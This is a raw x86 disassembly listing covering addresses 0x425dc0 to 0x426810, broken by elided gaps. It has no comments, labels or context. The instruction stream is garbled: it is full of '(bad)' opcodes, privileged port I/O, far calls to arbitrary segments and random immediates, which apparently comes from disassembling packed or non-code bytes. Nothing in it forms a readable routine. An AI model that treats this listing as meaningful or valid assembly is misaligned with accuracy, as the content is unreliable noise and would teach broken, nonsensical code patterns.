  425dc0:	sub    esi,DWORD PTR [eax+edi*1-0x7ae9d38e]
  425dc7:	jecxz  0x425e05
  425dc9:	push   edx
  425dca:	rcl    edi,cl
  425dcc:	sbb    dl,BYTE PTR [ecx+0x7a]
  425dcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425dd0:	xor    ebx,esi
  425dd2:	hlt    
  425dd3:	sub    al,0x45
  425dd5:	div    BYTE PTR [edi]
  425dd7:	add    al,BYTE PTR [edi+0x24d732d0]
  425ddd:	repz (bad) 
  425ddf:	scas   al,BYTE PTR es:[edi]
  425de0:	sbb    BYTE PTR ds:0x3160b7e2,al
  425de6:	mov    bh,0x51
  425de8:	xchg   eax,ebp
  425dea:	shr    dh,0xca
  425ded:	xchg   ebp,eax
  425dee:	mov    dh,0x9
  425df0:	stc    
  425df1:	cli    
  425df2:	call   0x848a:0x87480d8c
  425df9:	xor    al,0x1
  425dfb:	mov    ecx,0xd854f519
  425e00:	push   ss
  425e01:	xor    eax,ebx
  425e03:	scas   eax,DWORD PTR es:[edi]
  425e04:	ret    0x63b2
  425e07:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e0a:	or     dh,BYTE PTR [esp+edx*4+0x2a1b3b2c]
  425e11:	out    dx,eax
  425e12:	mov    dl,0x99
  425e14:	ret    
  425e15:	add    BYTE PTR [ecx-0x5e1fad7b],0x79
  425e1c:	jns    0x425e19
  425e1e:	cmp    bh,BYTE PTR [ebx+0x683c5a3b]
  425e24:	sar    BYTE PTR [edx+0x2e],0xf0
  425e28:	out    0x6,eax
  425e2a:	iret   
  425e2b:	pop    edx
  425e2c:	rcr    DWORD PTR ds:0x79a72569,0x31
  425e33:	test   BYTE PTR [ebx+0x0],al
	...
  425e95:	add    dh,al
  425e97:	jl     0x425eea
  425e99:	sar    bl,1
  425e9b:	std    
  425e9c:	(bad)  
  425e9d:	jle    0x425ea2
  425e9f:	test   BYTE PTR [edi],0xb2
  425ea2:	adc    al,0x5b
  425ea4:	mov    eax,ds:0x1942dd0
  425ea9:	add    BYTE PTR [edi],al
  425eab:	add    DWORD PTR [eax],eax
  425ead:	add    BYTE PTR [edx-0x19],ah
  425eb0:	inc    ebp
  425eb1:	or     dl,BYTE PTR [eax]
  425eb3:	iret   
  425eb4:	jmp    0x3b542609
  425eb9:	mov    al,BYTE PTR [ecx-0x77af93ce]
  425ebf:	mov    ebp,0x3c212a83
  425ec4:	push   eax
  425ec5:	cld    
  425ec6:	pop    ecx
  425ec7:	fiadd  WORD PTR [edx+0x5f0c2eca]
  425ecd:	cmp    ecx,ebp
  425ecf:	adc    esp,0x16fb5b39
  425ed5:	push   0x50
  425ed7:	popf   
  425ed8:	rcl    BYTE PTR [ebx-0x1097d1d7],cl
  425ede:	jecxz  0x425ea9
  425ee0:	mov    bl,0xc1
  425ee2:	pop    ds
  425ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ee4:	pop    es
  425ee5:	inc    esi
  425ee6:	pop    esi
  425ee7:	dec    edx
  425ee8:	sbb    BYTE PTR [ebx-0x7fbeeaaa],ch
  425eee:	inc    edi
  425eef:	leave  
  425ef0:	aad    0x10
  425ef2:	or     eax,0x52345065
  425ef7:	inc    eax
  425ef8:	aad    0x1b
  425efa:	in     al,dx
  425efb:	out    dx,eax
  425efc:	jne    0x425f6a
  425efe:	add    al,0xc4
  425f00:	and    BYTE PTR [ebx-0x48d65915],0x9a
  425f07:	jmp    0x425eea
  425f09:	xlat   BYTE PTR ds:[ebx]
  425f0a:	inc    eax
  425f0b:	jmp    eax
  425f0d:	push   esp
  425f0e:	in     al,0x6a
  425f10:	dec    DWORD PTR [esp+edi*2+0x6b9cbff7]
  425f17:	mov    DWORD PTR [ebx-0x138d64cb],edx
  425f1d:	xchg   esp,eax
  425f1e:	or     eax,DWORD PTR [ecx-0x3460b5f4]
  425f24:	stos   BYTE PTR es:[edi],al
  425f25:	aam    0xd5
  425f27:	psubw  mm7,QWORD PTR [edx+0x643c5ce0]
  425f2e:	dec    edi
  425f2f:	xchg   BYTE PTR [ecx],dh
  425f31:	pop    esi
  425f32:	and    BYTE PTR [esi+ecx*4-0x10e96f28],0x50
  425f3a:	push   ds
  425f3b:	jnp    0x425ec9
  425f3d:	pop    esi
  425f3e:	call   0xa40e5570
  425f43:	mov    esp,0xc63d7a3d
  425f48:	mov    edi,0xb94d23dd
  425f4d:	push   esp
  425f4e:	add    cl,BYTE PTR [ebp-0x6890afcf]
  425f54:	xor    ebx,edx
  425f56:	rol    DWORD PTR [ebp+0x6d],0x1c
  425f5a:	and    dh,BYTE PTR [ebx-0x36]
  425f5d:	pop    esp
  425f5e:	outs   dx,DWORD PTR ds:[esi]
  425f5f:	es ret 
  425f61:	int    0x1d
  425f63:	pop    DWORD PTR [eax]
  425f65:	sbb    BYTE PTR [esi+esi*1+0x5dbe208a],ch
  425f6c:	nop
  425f6d:	xor    al,0x47
  425f6f:	ficomp WORD PTR [ecx+0x57e178a1]
  425f75:	icebp  
  425f76:	shl    BYTE PTR [ebx+edx*1+0x7f],1
  425f7a:	mov    edi,0xc5c729f5
  425f7f:	rcl    BYTE PTR [ebx+ebx*8+0x72f33946],0x12
  425f87:	(bad)  
  425f88:	loope  0x425ffc
  425f8a:	pop    ss
  425f8b:	data16 jne 0x425f5e
  425f8e:	out    dx,al
  425f8f:	inc    ebp
  425f90:	aaa    
  425f91:	xchg   edi,eax
  425f92:	cs xor eax,0xd0afcbe9
  425f98:	pop    eax
  425f99:	mov    eax,ds:0xc998d9f7
  425f9e:	mov    BYTE PTR [ebx],bh
  425fa0:	repz adc DWORD PTR [ecx],ebx
  425fa3:	push   ecx
  425fa4:	dec    ebp
  425fa5:	mov    al,ds:0x2c28d419
  425faa:	dec    ecx
  425fab:	xor    al,0xe8
  425fad:	pop    ecx
  425fae:	fst    QWORD PTR [esi+0x20]
  425fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fb2:	mov    dl,0xf5
  425fb4:	or     al,0x0
	...
  426016:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42601c:	cmp    eax,0x791073bf
  426021:	mov    esi,0x4d77cd07
  426026:	xor    al,0x95
  426028:	add    DWORD PTR [eax],eax
  42602a:	pop    es
  42602b:	add    DWORD PTR [eax],eax
  42602d:	add    BYTE PTR [edi],bl
  42602f:	mov    al,0xf6
  426031:	adc    edi,DWORD PTR [eax]
  426033:	adc    DWORD PTR es:[ecx-0x5a],edi
  426037:	(bad)  
  426038:	(bad)  
  426039:	ret    0x809d
  42603c:	popf   
  42603d:	mov    edi,0x5e02c862
  426042:	daa    
  426043:	lds    esp,FWORD PTR [eax-0x44]
  426046:	pushf  
  426047:	aas    
  426048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426049:	scas   al,BYTE PTR es:[edi]
  42604a:	and    cl,BYTE PTR [ebx-0x61]
  42604d:	les    esi,FWORD PTR [ebp-0x66ffe366]
  426053:	lahf   
  426054:	pusha  
  426055:	test   eax,0x33241756
  42605a:	dec    esp
  42605b:	cmp    BYTE PTR [edi+0x3d61a044],cl
  426061:	inc    esi
  426062:	clc    
  426063:	jle    0x426084
  426065:	sub    al,0x8
  426067:	xchg   DWORD PTR [ecx-0x50885784],edx
  42606d:	lahf   
  42606e:	adc    al,0xc5
  426070:	sub    al,BYTE PTR [esi-0x50]
  426073:	sub    cl,dl
  426075:	jg     0x4260ab
  426077:	add    bh,0xee
  42607a:	pushf  
  42607b:	inc    edx
  42607c:	lea    ebp,[ebp+0x575f9fc9]
  426082:	aaa    
  426083:	dec    edx
  426084:	scas   al,BYTE PTR es:[edi]
  426085:	add    edx,DWORD PTR [edx+0x1ce11e4c]
  42608b:	(bad)  
  42608c:	scas   eax,DWORD PTR es:[edi]
  42608d:	push   0x2e635222
  426092:	les    edi,FWORD PTR [edi]
  426094:	xor    eax,0x6dcf22be
  426099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42609a:	add    eax,0x498de41c
  42609f:	add    esp,DWORD PTR [ebx-0x58]
  4260a2:	push   esp
  4260a3:	int3   
  4260a4:	test   al,0x2f
  4260a6:	sub    esp,DWORD PTR [ebx-0x382fff08]
  4260ac:	fsub   QWORD PTR [ecx]
  4260ae:	jo     0x426092
  4260b0:	and    BYTE PTR [ebx],dh
  4260b2:	jbe    0x4260b2
  4260b4:	outs   dx,DWORD PTR ds:[esi]
  4260b5:	shl    BYTE PTR [esi-0x663b40f],1
  4260bb:	xor    BYTE PTR [esi+ebx*8+0x1],bh
  4260bf:	stos   DWORD PTR es:[edi],eax
  4260c0:	(bad)  
  4260c1:	xor    DWORD PTR [ebx-0x2a2c7557],esp
  4260c7:	mov    bh,0xbb
  4260c9:	das    
  4260ca:	popf   
  4260cb:	cmp    DWORD PTR [eax+0x126df92c],esi
  4260d1:	adc    BYTE PTR [ecx],cl
  4260d3:	in     al,0x99
  4260d5:	(bad)  
  4260d6:	push   0xffffffe3
  4260d8:	mov    ds:0xd880abe7,al
  4260dd:	add    esi,eax
  4260df:	inc    ecx
  4260e0:	jmp    0x688a2fb4
  4260e5:	or     al,0xf6
  4260e7:	and    eax,0xbdc86ee0
  4260ec:	daa    
  4260ed:	push   0x8658b08
  4260f2:	xchg   esp,eax
  4260f3:	push   ds
  4260f4:	sar    DWORD PTR [ecx+0x456dafd1],0x53
  4260fb:	push   esi
  4260fc:	pop    ecx
  4260fd:	shl    BYTE PTR [ebp+0x24],cl
  426100:	mov    eax,ds:0xaeb38f49
  426105:	xor    ecx,DWORD PTR [edi-0x46d3e615]
  42610b:	test   BYTE PTR [ebx],bh
  42610d:	lds    esp,FWORD PTR [esi]
  42610f:	lahf   
  426110:	mov    BYTE PTR [edx-0x6784ca26],0xe7
  426117:	jnp    0x426145
  426119:	mov    esi,0xcc1612d6
  42611e:	clc    
  42611f:	mov    DWORD PTR [ecx],ecx
  426121:	aam    0xe0
  426123:	out    0x99,al
  426125:	pusha  
  426126:	daa    
  426127:	pop    esp
  426128:	mov    al,0xea
  42612a:	jo     0x4260fc
  42612c:	(bad)  
  42612d:	adc    BYTE PTR [ebx-0x574810d0],dh
  426133:	inc    edx
  426134:	push   0x0
	...
  426195:	add    BYTE PTR [ebx-0x409ef0df],bl
  42619b:	outs   dx,DWORD PTR ds:[esi]
  42619c:	(bad)  
  42619d:	sti    
  42619e:	outs   dx,DWORD PTR ds:[esi]
  42619f:	sub    BYTE PTR [ebx-0x1f54027d],bh
  4261a5:	push   ecx
  4261a6:	cmp    edx,DWORD PTR [esi+0x1070001]
  4261ac:	add    BYTE PTR [eax],al
  4261ae:	add    DWORD PTR [edi-0x4c],0x35
  4261b2:	jne    0x426148
  4261b4:	cmp    cl,BYTE PTR [ecx]
  4261b6:	popf   
  4261b7:	add    DWORD PTR [ebx+0x6e],0x25
  4261bb:	cwde   
  4261bc:	sub    al,0x48
  4261be:	push   es
  4261bf:	data16 mov BYTE PTR [ebx+0x16632f54],dh
  4261c6:	mov    eax,0x2f96fc9c
  4261cb:	dec    edi
  4261cc:	call   0x9042fb42
  4261d1:	fs push cs
  4261d3:	stc    
  4261d4:	xor    eax,0x51bbe7ff
  4261d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261da:	jp     0x4261c3
  4261dc:	mov    ?,WORD PTR fs:[esi+0x7704445f]
  4261e3:	jg     0x4261eb
  4261e5:	jbe    0x426257
  4261e7:	sti    
  4261e8:	jg     0x426266
  4261ea:	hlt    
  4261eb:	imul   esi,DWORD PTR [ebx],0x9c507ffd
  4261f1:	ss retf 
  4261f3:	push   esi
  4261f4:	add    al,0xdd
  4261f6:	out    0x7d,eax
  4261f8:	ret    0xf3f5
  4261fb:	dec    DWORD PTR [eax+0x1a1b016]
  426201:	inc    ecx
  426202:	xor    eax,0xc9738ddc
  426207:	out    0x1c,al
  426209:	mov    eax,gs:0xbb98735
  42620f:	pushf  
  426210:	cmp    eax,0x3158caa8
  426215:	ds loopne 0x426274
  426218:	call   0xefff143c
  42621d:	xchg   edx,eax
  42621e:	sbb    DWORD PTR ds:0x4918d579,ebp
  426224:	(bad)  
  426225:	mov    ebx,0x954bca06
  42622a:	xchg   esp,eax
  42622b:	and    al,cl
  42622d:	sbb    eax,0xba0ae4f6
  426232:	cdq    
  426233:	sub    al,0x9e
  426235:	inc    esi
  426236:	call   0x379c:0xb4c29f90
  42623d:	push   cs
  42623e:	lods   eax,DWORD PTR ds:[esi]
  42623f:	dec    ebx
  426240:	addr16 pop esi
  426242:	icebp  
  426243:	arpl   di,bp
  426245:	dec    edi
  426246:	inc    ecx
  426247:	xor    ebx,DWORD PTR [eax-0x6a32502b]
  42624d:	sub    cl,BYTE PTR [eax+0x4]
  426250:	js     0x426272
  426252:	ins    DWORD PTR es:[edi],dx
  426253:	sbb    ah,ah
  426255:	mov    edx,DWORD PTR [ebp+0x79]
  426258:	ja     0x426234
  42625a:	retf   
  42625b:	jl     0x4261eb
  42625d:	stc    
  42625e:	jge    0x4261e3
  426260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426261:	in     al,0x2b
  426263:	jns    0x4261fb
  426265:	sti    
  426266:	inc    eax
  426267:	pushf  
  426268:	jo     0x4261ea
  42626a:	mov    DWORD PTR [esp+ebx*8],0xc037f8ce
  426271:	retf   
  426272:	retf   0x77d0
  426275:	push   0x637f7a15
  42627a:	jae    0x4262e0
  42627c:	or     ah,ch
  42627e:	popa   
  42627f:	les    esi,FWORD PTR [esi]
  426281:	stos   BYTE PTR es:[edi],al
  426282:	scas   al,BYTE PTR es:[edi]
  426283:	stos   BYTE PTR es:[edi],al
  426284:	sbb    esi,DWORD PTR [ebx+ecx*4-0x35d48ce0]
  42628b:	sbb    DWORD PTR [esi],eax
  42628d:	jecxz  0x42622f
  42628f:	arpl   WORD PTR [ecx+0x477ea137],sp
  426295:	repz and al,0x76
  426298:	test   eax,0x4ea04760
  42629d:	fsubr  DWORD PTR [eax-0x6c]
  4262a0:	mov    BYTE PTR [esi-0x62],ch
  4262a3:	inc    edi
  4262a4:	repnz std 
  4262a6:	add    ah,BYTE PTR [ebx+0x74]
  4262a9:	ins    DWORD PTR es:[edi],dx
  4262aa:	bound  edx,QWORD PTR [edi+edi*8+0x3624e685]
  4262b1:	fld    TBYTE PTR [ebx]
  4262b3:	and    ch,BYTE PTR [ebx]
	...
  426315:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426319:	dec    esi
  42631a:	std    
  42631b:	out    dx,al
  42631c:	xlat   BYTE PTR ds:[ebx]
  42631d:	aas    
  42631e:	ins    BYTE PTR es:[edi],dx
  42631f:	lods   al,BYTE PTR ds:[esi]
  426320:	ret    0x3b54
  426323:	sbb    DWORD PTR [esi+0x197426b],edi
  426329:	add    BYTE PTR [edi],al
  42632b:	add    DWORD PTR [eax],eax
  42632d:	add    BYTE PTR [ebx-0x72],bl
  426330:	test   al,0x6b
  426332:	and    al,0x3e
  426334:	and    DWORD PTR [edx+ebx*8],esp
  426337:	jmp    0x191f:0xf4a9f3ab
  42633e:	mov    esp,DWORD PTR [edi]
  426340:	push   es
  426341:	pop    ebx
  426342:	je     0x4263b8
  426344:	and    DWORD PTR [edi],ebp
  426346:	mov    edi,0x3436268f
  42634b:	fld    DWORD PTR [ecx-0x16d7b3c6]
  426351:	bound  esi,QWORD PTR [ebx+0x2ae60429]
  426357:	enter  0x283a,0xdc
  42635b:	stc    
  42635c:	mov    ah,0x73
  42635e:	jno    0x42632f
  426360:	jne    0x42632f
  426362:	jmp    0x7bbd:0x3a34cf2e
  426369:	das    
  42636a:	or     esi,0xffffffa3
  42636d:	mov    dh,0xa
  42636f:	inc    edi
  426370:	dec    ecx
  426371:	mov    al,ds:0x34c24fa4
  426376:	popf   
  426377:	loope  0x426324
  426379:	sti    
  42637a:	mov    ds:0x25bf6f7c,al
  42637f:	cmp    eax,0x76b5f539
  426384:	ins    BYTE PTR es:[edi],dx
  426385:	mov    ds:0x9db4e8a2,eax
  42638a:	rcl    BYTE PTR [ebp-0x6c],cl
  42638d:	les    ebx,FWORD PTR [esi+0x5a]
  426390:	sbb    edx,edx
  426392:	sub    DWORD PTR [edi-0x41],esi
  426395:	mov    dh,0x3e
  426397:	test   DWORD PTR [edi+0x28fa53d3],ebx
  42639d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42639e:	(bad)  
  42639f:	xchg   ecx,eax
  4263a0:	inc    ebp
  4263a1:	aam    0x32
  4263a3:	jmp    0xe9da7a26
  4263a8:	xor    al,0x22
  4263aa:	scas   eax,DWORD PTR es:[edi]
  4263ab:	mov    BYTE PTR [ebx],ch
  4263ad:	das    
  4263ae:	add    al,0xb5
  4263b0:	dec    ebx
  4263b1:	push   esi
  4263b2:	sbb    DWORD PTR [ebp-0x7f],0x5a
  4263b6:	ins    BYTE PTR es:[edi],dx
  4263b7:	repz pusha 
  4263b9:	ins    DWORD PTR es:[edi],dx
  4263ba:	mov    ch,0xd2
  4263bc:	jle    0x426429
  4263be:	jo     0x42636c
  4263c0:	frstor [edi]
  4263c2:	jae    0x426407
  4263c4:	add    al,BYTE PTR [ebp+edi*2+0x7a935a1d]
  4263cb:	push   eax
  4263cc:	repnz sub eax,0xa584ab98
  4263d2:	shr    DWORD PTR [ecx-0x72],cl
  4263d5:	xor    bh,cl
  4263d7:	add    dl,BYTE PTR [ebx+edi*2-0x46]
  4263db:	fwait
  4263dc:	jo     0x426434
  4263de:	lahf   
  4263df:	jns    0x42639d
  4263e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263e2:	adc    DWORD PTR [ecx+0x59],0x2e80790b
  4263e9:	ins    BYTE PTR es:[edi],dx
  4263ea:	out    0xcc,eax
  4263ec:	xchg   edi,eax
  4263ed:	xchg   edx,eax
  4263ee:	jp     0x426458
  4263f0:	js     0x426444
  4263f2:	jle    0x42640b
  4263f4:	fs xor al,0x7f
  4263f7:	in     al,dx
  4263f8:	mov    ds:0x9660f29f,eax
  4263fd:	cdq    
  4263fe:	or     esi,DWORD PTR [edi-0x7]
  426401:	repnz test al,0x85
  426404:	test   al,0x6e
  426406:	push   edx
  426407:	dec    esi
  426408:	mov    ecx,0x6c642bee
  42640d:	mov    WORD PTR [ecx],?
  42640f:	jae    0x426479
  426411:	std    
  426412:	and    BYTE PTR ds:[esi+edi*8-0x14],dh
  426417:	push   cs
  426418:	cmp    BYTE PTR [ecx+0x15286f2d],al
  42641e:	xchg   DWORD PTR [edi+0x5f],esi
  426421:	int    0xe
  426423:	fcomp  DWORD PTR ds:0xe948f386
  426429:	fwait
  42642a:	cmp    DWORD PTR [edx-0x5d8d7934],ebp
  426430:	int    0x1
  426432:	inc    esi
  426433:	sbb    edi,edx
	...
  426495:	add    BYTE PTR [ecx+0x6f],ch
  426498:	mov    BYTE PTR [eax],cl
  42649a:	mov    gs,edi
  42649c:	jmp    0x7b21f210
  4264a1:	dec    esp
  4264a2:	sahf   
  4264a3:	jbe    0x426521
  4264a5:	push   0x19849
  4264aa:	pop    es
  4264ab:	add    DWORD PTR [eax],eax
  4264ad:	add    BYTE PTR [ecx-0x62],bl
  4264b0:	push   ss
  4264b1:	push   cs
  4264b2:	inc    ecx
  4264b3:	jecxz  0x4264ed
  4264b5:	fadd   QWORD PTR [eax+esi*8+0x47]
  4264b9:	mov    fs,ecx
  4264bb:	call   0x34bd2a3c
  4264c0:	sbb    al,0x56
  4264c2:	pop    ds
  4264c3:	xor    BYTE PTR [edi],al
  4264c5:	popa   
  4264c6:	repz xchg esi,eax
  4264c8:	enter  0x90f1,0x7c
  4264cc:	cld    
  4264cd:	in     eax,0x77
  4264cf:	pop    esp
  4264d0:	mov    esp,eax
  4264d2:	xor    dh,bh
  4264d4:	sbb    al,0x60
  4264d6:	ins    BYTE PTR es:[edi],dx
  4264d7:	cmp    eax,0x9a6266ef
  4264dc:	sub    al,BYTE PTR [ebx]
  4264de:	es and eax,0xb255a192
  4264e4:	sbb    DWORD PTR [esi],ebx
  4264e6:	retf   0x82b3
  4264e9:	fwait
  4264ea:	nop
  4264eb:	jp     0x4264d6
  4264ed:	xchg   BYTE PTR [edi],bh
  4264ef:	sbb    eax,0x27d06a51
  4264f4:	call   FWORD PTR [eax+0xd8ec846]
  4264fa:	pop    ds
  4264fb:	div    BYTE PTR [edx]
  4264fd:	clc    
  4264fe:	lods   al,BYTE PTR ds:[esi]
  4264ff:	daa    
  426500:	inc    esp
  426501:	adc    eax,0x1b652bd5
  426506:	push   ebp
  426507:	xchg   esi,eax
  426508:	pushf  
  426509:	pop    ebx
  42650a:	xchg   ebx,eax
  42650b:	fistp  WORD PTR [eax-0xe]
  42650e:	in     eax,dx
  42650f:	in     al,dx
  426510:	push   ss
  426511:	xchg   BYTE PTR [ebx+0x4e],ch
  426514:	or     eax,DWORD PTR [eax]
  426516:	add    BYTE PTR [ebp+0x66b051ca],bh
  42651c:	mov    ebp,DWORD PTR [ecx+edi*8-0xb]
  426520:	push   es
  426521:	push   esp
  426522:	int3   
  426523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426524:	dec    ebx
  426525:	push   eax
  426526:	mov    ecx,0xe821c493
  42652b:	shr    BYTE PTR [edi],1
  42652d:	sbb    ah,dl
  42652f:	jbe    0x426597
  426531:	sbb    DWORD PTR [esi+edi*4+0x6b77729],edx
  426538:	ret    0x9968
  42653b:	outs   dx,BYTE PTR ds:[esi]
  42653c:	ss jmp 0x6fbe0e1c
  426542:	imul   ecx,DWORD PTR [edi-0x22d53a9e],0x49
  426549:	repnz push 0x34aec7d6
  42654f:	and    BYTE PTR ds:0xddc2c094,cl
  426555:	xchg   ebp,eax
  426556:	ret    
  426557:	fsub   QWORD PTR [ebx]
  426559:	dec    ebx
  42655a:	dec    esi
  42655b:	or     al,0x34
  42655d:	jnp    0x426582
  42655f:	retf   0xad24
  426562:	mul    DWORD PTR [ecx]
  426564:	fisttp DWORD PTR [esi+0x4]
  426567:	retf   
  426568:	and    al,0x12
  42656a:	mov    edx,0x649f32a3
  42656f:	aas    
  426570:	(bad)  
  426571:	mov    ecx,0x281bd887
  426576:	fst    st(2)
  426578:	or     eax,0x7f286627
  42657d:	push   0xeb2ec014
  426582:	stc    
  426583:	jae    0x4265e1
  426585:	aaa    
  426586:	mov    eax,0xaf119375
  42658b:	add    DWORD PTR [ecx+edi*2],0xffffffe0
  42658f:	addr16 pop eax
  426591:	ss push 0xd303d140
  426597:	push   eax
  426598:	sbb    eax,DWORD PTR [esp+ecx*2]
  42659b:	psubsw mm5,QWORD PTR [edi]
  42659e:	sbb    bl,BYTE PTR [edx-0x5f]
  4265a1:	sub    eax,0xb0948039
  4265a6:	mov    ds:0xc641adcc,al
  4265ab:	xchg   ebx,eax
  4265ac:	fcmovnb st,st(0)
  4265ae:	xchg   esp,eax
  4265af:	push   0x45c80bc6
  4265b4:	scas   al,BYTE PTR es:[edi]
	...
  426615:	add    BYTE PTR [edx],dl
  426617:	retf   
  426618:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42661e:	xor    DWORD PTR [ecx+0x6f],0x2f
  426622:	lds    edi,FWORD PTR ds:0x99508743
  426628:	add    DWORD PTR [eax],eax
  42662a:	pop    es
  42662b:	add    DWORD PTR [eax],eax
  42662d:	add    BYTE PTR [edx-0x66],al
  426630:	pop    ecx
  426631:	inc    edi
  426632:	pushf  
  426633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426634:	xchg   edi,eax
  426635:	das    
  426636:	stos   BYTE PTR es:[edi],al
  426637:	je     0x426680
  426639:	test   BYTE PTR [ebx+ecx*2+0x79],dh
  42663d:	ins    BYTE PTR es:[edi],dx
  42663e:	shl    DWORD PTR [ecx],1
  426640:	adc    ah,0x3d
  426643:	ds add al,0x1c
  426646:	lds    esp,FWORD PTR [ebx+edi*8]
  426649:	jl     0x426694
  42664b:	inc    esp
  42664c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42664d:	dec    DWORD PTR [ebp-0x5e]
  426650:	xchg   DWORD PTR [edx],ecx
  426652:	ret    
  426653:	int    0x11
  426655:	jp     0x4266c1
  426657:	ins    DWORD PTR es:[edi],dx
  426658:	or     dl,BYTE PTR [bp+si]
  42665b:	paddq  mm4,QWORD PTR [edx+0x5e0ed3e3]
  426662:	sub    al,0xc0
  426664:	stc    
  426665:	(bad)  [ebp+0x64b01043]
  42666b:	adc    eax,0x211bb140
  426670:	fmul   DWORD PTR [edx+0x78]
  426673:	cdq    
  426674:	xor    esi,DWORD PTR [edi-0x1]
  426677:	aaa    
  426678:	pop    es
  426679:	(bad)  
  42667a:	fst    DWORD PTR [ebx-0x4d662733]
  426680:	dec    edx
  426681:	ins    DWORD PTR es:[edi],dx
  426682:	ds push edx
  426684:	mov    ch,0xa0
  426686:	jg     0x4266bf
  426688:	test   al,0xa
  42668a:	mov    ecx,0xac5986bb
  42668f:	test   BYTE PTR [ebp-0x1d],0xea
  426693:	int    0xee
  426695:	fst    DWORD PTR [eax+0x4c]
  426698:	inc    eax
  426699:	add    BYTE PTR [edi],cl
  42669b:	mov    esp,esp
  42669d:	sub    BYTE PTR [ebx+ebx*2],dh
  4266a0:	add    DWORD PTR [edx+ecx*1+0x9],edx
  4266a4:	out    dx,eax
  4266a5:	ss push ebp
  4266a7:	and    DWORD PTR [eax+0x7d123707],ebp
  4266ad:	inc    edx
  4266ae:	xor    BYTE PTR [ecx],al
  4266b0:	mov    DWORD PTR [ebp+0x671bad64],ecx
  4266b6:	and    esp,ecx
  4266b8:	add    BYTE PTR [ecx],bh
  4266ba:	das    
  4266bb:	popf   
  4266bc:	sbb    cl,BYTE PTR [esi-0x30]
  4266bf:	xor    DWORD PTR [eax-0x18],edi
  4266c2:	inc    ebx
  4266c3:	shr    BYTE PTR [ebx-0x3f],0x57
  4266c7:	pusha  
  4266c8:	lods   eax,DWORD PTR ds:[esi]
  4266c9:	inc    esp
  4266ca:	adc    bl,ch
  4266cc:	inc    ebx
  4266cd:	data16 sbb ch,BYTE PTR [ecx+0xb]
  4266d1:	lods   eax,DWORD PTR ds:[esi]
  4266d2:	cmp    ah,BYTE PTR [esi-0x7f1cb99c]
  4266d8:	sub    BYTE PTR [eax-0x1e],ch
  4266db:	int3   
  4266dc:	dec    edx
  4266dd:	dec    esp
  4266de:	cli    
  4266df:	dec    eax
  4266e0:	push   ebx
  4266e1:	add    ecx,DWORD PTR [eax]
  4266e3:	sbb    DWORD PTR [eax+0x38],ebp
  4266e6:	mov    eax,DWORD PTR [ecx-0x2d]
  4266e9:	fucomi st,st(3)
  4266eb:	ss jmp 0x4c95435c
  4266f1:	pop    edx
  4266f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266f3:	or     DWORD PTR [ecx-0x58a6f38e],edx
  4266f9:	mov    bl,0x80
  4266fb:	das    
  4266fc:	xchg   edi,eax
  4266fd:	loope  0x42671a
  4266ff:	lds    ebx,FWORD PTR [ebp-0x4b5f3cd2]
  426705:	xchg   DWORD PTR [ebx],ebx
  426707:	shr    DWORD PTR [ecx+0x54],0x7d
  42670b:	fnstcw WORD PTR [eax]
  42670d:	or     DWORD PTR [edx],ecx
  42670f:	lods   al,BYTE PTR ds:[esi]
  426710:	xchg   edi,edx
  426712:	jns    0x4266d6
  426714:	adc    eax,0xdd16259f
  426719:	ja     0x42679a
  42671b:	test   eax,0xc33f387c
  426720:	xchg   ebx,eax
  426721:	xor    BYTE PTR [esi],ch
  426723:	jmp    0x4266c0
  426725:	mov    BYTE PTR [ebp-0x2abc4790],dh
  42672b:	dec    ebx
  42672c:	push   0x64
  42672e:	fincstp 
  426730:	push   edx
  426731:	cld    
  426732:	ror    dh,1
  426734:	dec    eax
	...
  426795:	add    BYTE PTR [eax-0xd53173],bh
  42679b:	imul   edi,esp,0xffffff9f
  42679e:	sbb    esp,eax
  4267a0:	leave  
  4267a1:	dec    ebx
  4267a2:	mov    ch,0x3d
  4267a4:	sahf   
  4267a5:	stc    
  4267a6:	push   edi
  4267a7:	call   0x0:0x1070001
  4267ae:	pop    ecx
  4267af:	mov    ecx,esi
  4267b1:	fidiv  DWORD PTR [ebp+ebx*8+0x1ee723e9]
  4267b8:	and    bl,BYTE PTR [ebx]
  4267ba:	sahf   
  4267bb:	sub    edi,DWORD PTR [ebp-0x75]
  4267be:	aaa    
  4267bf:	lods   al,BYTE PTR ds:[esi]
  4267c0:	outs   dx,BYTE PTR ds:[esi]
  4267c1:	sub    BYTE PTR [ecx],bl
  4267c3:	add    ch,BYTE PTR [ebx+0x2ea1254f]
  4267c9:	es sub edi,eax
  4267cc:	aad    0x8d
  4267ce:	adc    al,0xe0
  4267d0:	lock test DWORD PTR [edi-0x64],0x57212ec0
  4267d8:	pop    ebp
  4267d9:	fistp  WORD PTR [ebx-0x2e]
  4267dc:	imul   edi,DWORD PTR [edx-0x6f1cc9c2],0x3f
  4267e3:	xchg   ebp,eax
  4267e4:	loope  0x4267d6
  4267e6:	in     eax,0x15
  4267e8:	add    al,bl
  4267ea:	xor    edi,DWORD PTR [eax]
  4267ec:	adc    al,0xf6
  4267ee:	loope  0x426813
  4267f0:	mov    al,0x1e
  4267f2:	js     0x426841
  4267f4:	and    ah,cl
  4267f6:	mov    esp,DWORD PTR [esi+0x3ffaa83]
  4267fc:	mov    edx,0x7071aae0
  426801:	jb     0x426788
  426803:	mov    edi,0xc20f41fb
  426808:	in     eax,0x68
  42680a:	fcomp  st(6)
  42680c:	lahf   
  42680d:	and    DWORD PTR [ecx],ecx
  42680f:	push   es
  426810:	xchg   ebx,eax
